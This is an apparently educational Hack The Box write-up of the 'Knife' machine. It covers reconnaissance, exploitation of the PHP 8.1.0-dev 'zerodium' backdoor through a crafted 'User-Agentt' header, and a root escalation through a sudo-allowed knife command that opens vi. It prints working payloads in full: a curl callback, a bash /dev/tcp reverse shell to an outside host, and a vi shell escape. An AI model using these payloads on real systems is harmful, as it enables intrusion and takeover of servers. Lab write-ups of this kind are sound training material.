# Hack The Box — Knife

> **Difficulty:** Easy  
> **OS:** Linux  
> **IP:** `10.129.99.93`  
> **Domain:** Not identified

---

# 1. Initial Recon

## Nmap

I started with a full TCP port scan using default scripts and service/version detection:

```bash
nmap -sC -sV -p- --min-rate=1000 10.129.99.93
```

The scan revealed two open ports:

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

The HTTP service returned the page title `Emergent Medical Idea`.

## Directory Enumeration

I used FFUF to enumerate common directories and files:

```bash
ffuf -w /usr/share/wordlists/dirb/common.txt \
-u http://10.129.99.93/FUZZ -fc 403
```

The only interesting result was:

```text
index.php [Status: 200, Size: 5815, Words: 646, Lines: 221]
```

Nothing particularly useful was discovered through directory enumeration, so I moved on to inspecting the web application's response headers.

---

# 2. Initial Foothold

## Identifying the PHP Backdoor

I sent a HEAD request to `index.php` to inspect the response headers:

```bash
curl -I http://10.129.99.93/index.php
```

The response revealed the PHP version:

```http
HTTP/1.1 200 OK
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
Content-Type: text/html; charset=UTF-8
```

The `X-Powered-By` header exposed **PHP 8.1.0-dev**, a version known to contain a backdoor introduced through two malicious commits pushed to the PHP source repository on March 28, 2021.

The backdoor checks for the string `zerodium` in a specially crafted `User-Agentt` HTTP header. If the string is present, the code following it is evaluated as PHP.

This provides an opportunity to execute arbitrary commands on the target.

## Verifying Remote Code Execution

Before attempting to obtain a reverse shell, I first verified command execution by making the target send an HTTP request to my machine.

I started a Python HTTP server on port 90:

```bash
sudo python3 -m http.server 90
```

Then I sent the following request:

```bash
curl http://10.129.99.93/index.php \
-H 'User-Agentt: zerodiumsystem("curl 10.10.14.233:90");'
```

The Python server received a connection from the target:

```text
Serving HTTP on 0.0.0.0 port 90 ...

10.129.99.93 - - [13/Nov/2026 07:06:49] "GET / HTTP/1.1" 200 -
```

This confirmed that the PHP backdoor was executing commands remotely.

## Obtaining a Reverse Shell

With command execution confirmed, I started a Netcat listener on port 1234:

```bash
nc -nlvp 1234
```

I then used the backdoor to execute a Bash reverse shell:

```bash
curl http://10.129.99.93/index.php \
-H "User-Agentt: zerodiumsystem(\"bash -c 'bash -i &>/dev/tcp/10.10.14.233/1234 0>&1 '\");"
```

The connection was successful, and I received a shell as `james`:

```text
Listening on 0.0.0.0 1234
Connection received on 10.129.99.93 46372

bash: cannot set terminal process group (895): Inappropriate ioctl for device
bash: no job control in this shell

james@knife:/$
```

---

# 3. User Access

After obtaining a shell, I navigated to James's home directory:

```bash
cd /home
ls
```

The directory contained:

```text
james
```

I then checked the contents of the user's home directory:

```bash
cd /home/james
ls
```

The `user.txt` file was present:

```text
user.txt
```

I retrieved the user flag:

```bash
cat user.txt
```

---

# 4. Privilege Escalation

## Checking Sudo Permissions

Next, I checked which commands the `james` account could execute with sudo:

```bash
sudo -l
```

The output showed:

```text
Matching Defaults entries for james on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

The important finding was that `james` could execute `/usr/bin/knife` as root without supplying a password.

## Exploiting Knife

The `knife` utility supports opening an editor when creating a data bag. Since Vim allows shell command execution, I could use this functionality to escape into a root shell.

I executed:

```bash
sudo knife data bag create 1 2 -e vi
```

This opened the Vim editor with root privileges.

Inside Vim, I entered the following command:

```vim
:!/bin/sh
```

This executed `/bin/sh` as root, successfully escalating my privileges.

---

# 5. Root Access

After obtaining the root shell, I had full control over the machine.

The root flag can be retrieved with:

```bash
cat /root/root.txt
```

---

# Attack Chain

1. **Reconnaissance:** Identified SSH on port 22 and Apache on port 80.
2. **Enumeration:** Discovered `index.php` and inspected its HTTP response headers.
3. **Initial Foothold:** Identified the vulnerable PHP 8.1.0-dev backdoor.
4. **Remote Code Execution:** Used the `User-Agentt` header with the `zerodium` trigger to execute commands.
5. **User Access:** Obtained a reverse shell as `james`.
6. **Privilege Escalation:** Found that `james` could run `/usr/bin/knife` as root without a password.
7. **Root Access:** Abused the Vim editor launched by Knife to execute `/bin/sh` as root.

---

# Vulnerabilities

| Vulnerability | Description |
|---|---|
| PHP 8.1.0-dev Backdoor | A malicious backdoor in the development version of PHP allowed remote command execution through a specially crafted HTTP header. |
| Sudo Misconfiguration | The `james` user could execute `/usr/bin/knife` as root without a password. |
| Vim Shell Escape | The editor launched by Knife allowed commands to be executed with root privileges. |

---

# Key Takeaways

- Always inspect HTTP response headers when enumerating web applications. They can reveal useful information about the underlying technology and version.
- Development versions of software may contain vulnerabilities that are not present in stable releases.
- Verify suspected command execution with a harmless callback before attempting to obtain a reverse shell.
- Review sudo permissions carefully. Even legitimate administrative utilities can provide privilege escalation paths when they allow arbitrary editors to be launched as root.
- Editors such as Vim can provide shell escapes, making unrestricted editor execution as root dangerous.

---

# Flags

| Flag | Location | User |
|---|---|---|
| User | `/home/james/user.txt` | `james` |
| Root | `/root/root.txt` | `root` |